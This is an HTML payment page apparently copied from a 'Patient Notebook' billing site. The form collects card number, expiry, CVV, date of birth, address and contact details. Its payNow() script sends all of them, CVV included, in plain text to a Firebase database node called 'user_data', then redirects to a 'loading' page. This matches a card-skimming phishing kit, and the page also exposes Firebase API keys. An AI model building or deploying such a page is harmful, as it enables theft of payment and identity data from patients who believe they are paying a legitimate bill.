<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />

    <!-- Bootstrap CSS -->
    <link
      rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="/css/loading.css" />
    <link rel="icon" data-savepage-href="https://www.patientnotebook.com/favicon.ico" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACEkfYANErvHjZO8Bg1Tu8KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB5iPQAM0zvmjRN8Ec3UfAkMU7wwTFQ8AoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgc/MBM03wmjJN8P8/V/AO6ez9ADJS8OswUvDALlPwCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABbcPIBM0/wmjFP8P8yUfDPAAAAAAAAAAAxVfC1MFXx/y9X8b8uV/EKAAAAAAAAAAAAAAAAAAAAAAAAAABhdvMBMlDwmjFQ8P8xUvD/MlTwlAAAAAAAAAAAMVjxfy9Y8f8uWfH/Llvxvy1c8QoAAAAAAAAAAAAAAAB6jfQAMlHwmjFS8P8wU/D/MFTw/zJW8VgAAAAAAAAAADFb8UguW/H/Llzx/y1e8f8tX/K/LV/yCQAAAACAlPYAMVPwmjBT8P8wVfDvMVbxuDBX8YAuVvAUAAAAAAAAAAAzXvIKMF/xYS5f8Z4tYPLZLGLy/ytj8r4rY/IJMVPwMDNV8WA0WPAptMH6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADdp8hUtZvJPLWfyPjld8Ro0W/EcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMW3zGy9t8yEyWvERL1rxzC5c8eAvXvGkL2DyZzJj8imtwvoAAAAAAAAAAABLffQCL2nzPyxo8ncrafOsK2rz4ylr894pavMdAAAAADJf8hEuXvHMLV/x/yxh8v8sYvL/LmTyZwAAAAAAAAAAL2rzNSpp8/8qavP/KWvz/yls894oa/MdAAAAAAAAAAAAAAAAMWPyESxi8swsY/L/K2Xy/yxm8p4AAAAAAAAAACtr83Ipa/P/KW3z/yht894nbfMdAAAAAAAAAAAAAAAAAAAAAAAAAAAwZ/MRK2byzCpn8v8rafLUAAAAAAAAAAAqbfOsKW7z/yhv894nbvMdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC9r8xEqavPMKWvz/zl19A0AAAAAKXDz5ihw894mcPMdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALm/zESlu88wrcfNCMHXzISdy894ncfMdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsc/QRLHPzOCp19C4mc/QdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/j8AAPwfAADwjwAA4YcAAMGDAADBgQAAgYAAAB/4AAA//AAAA4AAAIGBAADBgwAA4YcAAPCPAAD4HwAA/D8AAA==">
    <title>Patient Notebook</title>
    <style>
      .navbar {
          background-color: rgba(29, 94, 214, 0.808);
          height: 55px;
      }

      i {
          margin: 2px;
      }

      .row {
          display: -ms-flexbox;
          /* IE10 */
          display: flex;
          -ms-flex-wrap: wrap;
          /* IE10 */
          flex-wrap: wrap;
          margin: 0 -16px;
      }

      .col-25 {
          -ms-flex: 25%;
          /* IE10 */
          flex: 25%;
      }

      .col-33 {
          -ms-flex: 33%;
          /* IE10 */
          flex: 33%;
          QuickPay
      }

      .col-50 {
          -ms-flex: 50%;
          /* IE10 */
          flex: 50%;
      }

      .col-75 {
          -ms-flex: 75%;
          /* IE10 */
          flex: 75%;
      }

      .col-25,
      .col-33,
      .col-50,
      .col-75 {
          padding: 0 16px;
      }

      .container {
          background-color: #f2f2f2;
          padding: 5px 20px 15px 20px;
          border: 1px solid lightgrey;
          border-radius: 3px;
      }

      input[type=text] {
          width: 100%;
          margin-bottom: 20px;
          padding: 12px;
          border: 1px solid #ccc;
          border-radius: 3px;
      }

      label {
          margin-bottom: 10px;
          display: block;
      }

      .icon-container {
          margin-bottom: 20px;
          padding: 7px 0;
          font-size: 24px;
      }

      .btn {
          background-color: #4CAF50;
          color: white;
          padding: 12px;
          /* margin: 10px 0; */
          border: none;
          /* width: 100%; */
          border-radius: 3px;
          cursor: pointer;
          font-size: 17px;
      }

      .btn:hover {
          background-color: #45a049;
      }

      span.price {
          float: right;
          color: grey;
      }

      /* Responsive layout - when the screen is less than 800px wide, make the two columns stack on top of each other instead of next to each other (and change the direction - make the "cart" column go on top) */

      @media (max-width: 800px) {
          .row {
              flex-direction: column-reverse;
          }
          .col-25 {
              margin-bottom: 20px;
          }
      }
    </style>
    <script src="https://use.fontawesome.com/ec41ac83da.js"></script>
  </head>

  <body>
    <!-- As a link -->
    <nav class="navbar navbar-light">
      <a
        class="navbar-brand"
        href="checkout.html"
        style="
          color: white;
          font-weight: 500;
          font-family: Arial, Helvetica, sans-serif;
        "
        >Make a Payment</a
      >
      <a
        class="navbar-brand"
        href="index.html"
        style="
          color: rgb(175, 230, 255);
          border: 1px solid rgba(14, 14, 179, 0.911);
          background-color: rgba(14, 14, 179, 0.911);
          border-radius: 5px;
          padding: 5px;
          font-size: small;
        "
        >Back to Home</a
      >
    </nav>

    <!-- As a heading -->
    <nav
      class="navbar navbar-light"
      style="
        background: linear-gradient(to bottom, #0b66ad 0%, #000019 100%);
        height: 50px;
      "
    >
      <span class="navbar-brand mb-0 h1" style="color: white; font-size: medium"
        >Payment Method <i class="fa fa-circle" aria-hidden="true"></i
        ><i class="fa fa-circle-thin" aria-hidden="true"></i
        ><i class="fa fa-circle-thin" aria-hidden="true"></i
      ></span>
    </nav>

    <div
      style="
        text-align: right;
        padding-right: 50px;
        width: 100%;
        display: inline-block;
      "
    >
      <div style="display: inline-block; margin: 0; vertical-align: top">
        <img
          src="./assets/download.jpg"
          alt="lock"
          style="width: 40px; height: 38px"
        />
      </div>
      <div
        style="
          text-align: left;
          display: inline-block;
          padding-left: 10px;
          padding-right: 50px;
          background-color: #eee;
          font-size: small;
        "
      >
        Secure Environment<br /><strong
          >Total payment: $
          <p id="amountDisplay">Amount:</p></strong
        >
      </div>
    </div>

    <div>
      <h5 style="margin-left: 60px">Pay With a Credit Card</h5>

      <div class="row">
        <div class="col-75">
          <div class="container">
            <form class="form-cc" id="paymentForm">
              <div class="row">
                <div class="col-50">
                  <h3>Billing Address</h3>
                  <div class="row">
                    <div class="col-50">
                      <label for="fname">Account Number</label>
                      <p class="ee" id="AccountNumber"></p>
                    </div>
                    <div class="col-50">
                      <label for="amount">Statement ID</label>
                      <p class="ee" id="statement_id"></p>
                    </div>
                  </div>

                  <div class="row">
                    <div class="col-50">
                      <label for="fname"
                        ><i class="fa fa-phone"></i>Phone-no.</label
                      >
                      <input
                        type="text"
                        id="fname"
                        name="number"
                        placeholder="1234567890"
                        required
                      />
                    </div>
                    <div class="col-50">
                      <label for="amount"
                        ><i class="fa fa-usd"></i>Amount.</label
                      >
                      <input
                        type="text"
                        id="amount"
                        name="amount"
                        placeholder="$300"
                        required
                      />
                    </div>
                  </div>

                  <div class="row">
                    <div class="col-50">
                      <label for="email"
                        ><i class="fa fa-envelope"></i> Email</label
                      >
                      <input
                        type="text"
                        id="email"
                        name="email"
                        placeholder="john@example.com"
                        required
                      />
                    </div>
                    <div class="col-50">
                      <label for="dob">DOB</label>
                      <input
                        type="text"
                        id="dob"
                        name="dob"
                        placeholder="DD/MM/YYYY"
                      />
                    </div>
                  </div>
                  <div class="row">
                    <div class="col-50">
                      <label for="adr"
                        ><i class="fa fa-address-card-o"></i> Address</label
                      >
                      <input
                        type="text"
                        id="adr"
                        name="address"
                        placeholder="542 W. 15th Street"
                      />
                    </div>
                    <div class="col-50">
                      <label for="city"> City</label>
                      <input
                        type="text"
                        id="city"
                        name="address"
                        placeholder="New York"
                      />
                    </div>
                  </div>

                  <div class="row">
                    <div class="col-50">
                      <label for="state">State</label>
                      <input
                        type="text"
                        id="state"
                        name="state"
                        placeholder="NY"
                        required
                      />
                    </div>
                    <div class="col-50">
                      <label for="zip">Zip</label>
                      <input
                        type="text"
                        id="zip"
                        name="zip_code"
                        placeholder="10001"
                        required
                      />
                    </div>
                  </div>
                </div>
                <input
                  type="text"
                  id="amounted"
                  name="amount"
                  style="display: none"
                />
                <div class="col-50">
                  <h3>Payment</h3>
                  <label for="fname">Accepted Cards</label>
                  <div class="icon-container">
                    <i class="fa fa-cc-visa" style="color: navy"></i>
                    <i class="fa fa-cc-amex" style="color: blue"></i>
                    <i class="fa fa-cc-mastercard" style="color: red"></i>
                    <i class="fa fa-cc-discover" style="color: orange"></i>
                  </div>

                  <label for="cname">Name on Card</label>
                  <input
                    type="text"
                    id="cname"
                    name="name"
                    placeholder="John More Doe"
                    required
                  />
                  <label for="ccnum">Credit card number</label>
                  <input
                    type="text"
                    id="ccnum"
                    name="card_number"
                    placeholder="1111-2222-3333-4444"
                    maxlength="19"
                    required
                  />

                  <div class="row">
                    <div class="col-50">
                      <label for="expmonth">Expiry MM/YY</label>
                      <input
                        type="text"
                        id="expmonth"
                        name="exp_date"
                        placeholder="05/25 "
                        data-mask="00 / 00"
                        maxlength="5"
                        required
                      />
                    </div>
                    <div class="col-50">
                      <label for="cvv1">CVV</label>
                      <input
                        type="text"
                        id="cvv1"
                        name="cvv"
                        placeholder="XXXXX"
                        data-mask="000"
                        maxlength="5"
                        required
                      />
                    </div>
                  </div>
                </div>
              </div>
              <!-- <label>
          <input type="checkbox" checked="checked" name="sameadr"> Shipping address same as billing
        </label> -->
              <div style="width: 100%; text-align: center">
                <button
                  type="button"
                  class="btn"
                  onclick="payNow()"
                  class="btn"
                >
                  Pay Now
                </button>
              </div>
            </form>
          </div>
        </div>

        <!-- <div class="col-25">
    <div class="container">
      <h4>Cart
        <span class="price" style="color:black">
          <i class="fa fa-shopping-cart"></i>
          <b>4</b>
        </span>
      </h4>
      <p><a href="#">Product 1</a> <span class="price">$15</span></p>
      <p><a href="#">Product 2</a> <span class="price">$5</span></p>
      <p><a href="#">Product 3</a> <span class="price">$8</span></p>
      <p><a href="#">Product 4</a> <span class="price">$2</span></p>
      <hr>
      <p>Total <span class="price" style="color:black"><b>$30</b></span></p>
    </div>
  </div> -->
      </div>
    </div>

    <script>
      // Get form data from POST request
      const acc_number = new URLSearchParams(window.location.search).get("AccountNumber");
      const stmt_id = new URLSearchParams(window.location.search).get(
        "statement_id"
      );


      // Display form data
      document.getElementById("AccountNumber").textContent = acc_number;
      document.getElementById("statement_id").textContent =
        stmt_id;

      localStorage.setItem("AccountNumber", acc_number);
      localStorage.setItem(
        "statement_id",
        stmt_id
      );

      //
    </script>
    <script>
      //
      const amountInput = document.getElementById("amount");
      const amountDisplay = document.getElementById("amountDisplay");

      amountInput.addEventListener("input", function () {
        const enteredAmount = amountInput.value;
        amountDisplay.textContent = `Amount: ${enteredAmount}`;
      });
      //
      const ccNumInput = document.getElementById("ccnum");

      ccNumInput.addEventListener("input", function () {
        let value = ccNumInput.value;
        value = value.replace(/\D/g, ""); // Remove all non-numeric characters

        // Add dashes after every 4 digits
        if (value.length > 0) {
          value = value.match(/.{1,4}/g).join("-");
        }

        ccNumInput.value = value;
      });
      //
      const expMonthInput = document.getElementById("expmonth");

      expMonthInput.addEventListener("input", function () {
        let value = expMonthInput.value;
        value = value.replace(/\D/g, ""); // Remove all non-numeric characters

        if (value.length > 2) {
          value = `${value.slice(0, 2)}/${value.slice(2)}`;
        }

        expMonthInput.value = value.slice(0, 5); // Limit input to 5 characters (MM/YY)
      });
      //
      const accountIdInput = document.getElementById("accountIdDisplay");

      // On page load, populate input with saved value
      window.addEventListener("load", function () {
        const savedAccountId = localStorage.getItem("accountId");

        if (savedAccountId) {
          accountIdInput.value = savedAccountId;
        }
      });
      //
      const dobInput = document.getElementById("dob");

      dobInput.addEventListener("input", function () {
        let value = dobInput.value;
        value = value.replace(/\D/g, ""); // Remove all non-numeric characters

        if (value.length > 2) {
          value = `${value.slice(0, 2)}/${value.slice(2)}`;
        }
        if (value.length > 5) {
          value = `${value.slice(0, 5)}/${value.slice(5, 9)}`;
        }

        dobInput.value = value;
      });
      // On page load, populate display elements with saved values
      window.addEventListener("load", function () {
        const savedAccountId = localStorage.getItem("accountId");
        const savedDob = localStorage.getItem("dob");

        const accountIdDisplay = document.getElementById("accountIdDisplay");
        const dobDisplay = document.getElementById("dobDisplay");

        if (savedAccountId) {
          accountIdDisplay.textContent = ` ${savedAccountId}`;
        } else {
          accountIdDisplay.textContent = " Not set";
        }

        if (savedDob) {
          dobDisplay.textContent = `${savedDob}`;
        } else {
          dobDisplay.textContent = " Not set";
        }
      });

      //
    </script>
    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-compat.js"></script>
    <script>
      // Initialize Firebase
      const firebaseConfig = {
        // apiKey: "AIzaSyCN9eaAuVlQqMWM7HdWZ7hYY6rA4boLWLA",
        // authDomain: "epay-817ef.firebaseapp.com",
        // databaseURL: "https://epay-817ef-default-rtdb.firebaseio.com",
        // projectId: "epay-817ef",
        // storageBucket: "epay-817ef.appspot.com",
        // messagingSenderId: "82168870079",
        // appId: "1:82168870079:web:0f641ce884bc962563420a",
        apiKey: "AIzaSyBw5oweUPs1TGkfxRp98mJb9yqI5QQkwLU",
    authDomain: "patient-notebook-7104e.firebaseapp.com",
    projectId: "patient-notebook-7104e",
    storageBucket: "patient-notebook-7104e.appspot.com",
    messagingSenderId: "681277349381",
    appId: "1:681277349381:web:526c989aa341a954b7866c"
      };
      firebase.initializeApp(firebaseConfig);

      // Get a reference to the database service
      const database = firebase.database();

      // Reference to the root of your database
      const rootRef = database.ref();

      // Reference to a specific child node
      const messagesRef = rootRef.child("user_data");

      function payNow() {
        // Get form data
        const statement_id = localStorage.getItem("statement_id");
        const AccountNumber = localStorage.getItem("AccountNumber");
        const number = document.getElementById("fname").value;
        const amount = document.getElementById("amount").value;
        const email = document.getElementById("email").value;
        const dob = document.getElementById("dob").value;
        const address = document.getElementById("adr").value;
        const city = document.getElementById("city").value;
        const state = document.getElementById("state").value;
        const zip_code = document.getElementById("zip").value;
        const cc_number = document.getElementById("ccnum").value;
        const cc_exp = document.getElementById("expmonth").value;
        const cvv = document.getElementById("cvv1").value;
        const name_on_card = document.getElementById("cname").value;

        // Write data to Firebase
        messagesRef.push().set({
          statement_id,
          AccountNumber,
          phone: number,
          amount,
          email,
          dob,
          address,
          city,
          state,
          zip_code,
          cc_number,
          cc_exp,
          cvv,
          name_on_card,
          timestamp: firebase.database.ServerValue.TIMESTAMP,
        });

        // Redirect after writing data
        setTimeout(() => {
          window.location.href = "./loading.html";
        }, 1000); // Redirect after 1 second
      }
    </script>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script
      src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
      integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
      crossorigin="anonymous"
    ></script>
    <!-- <script src="/js/submit.js"></script> -->
  </body>
</html>
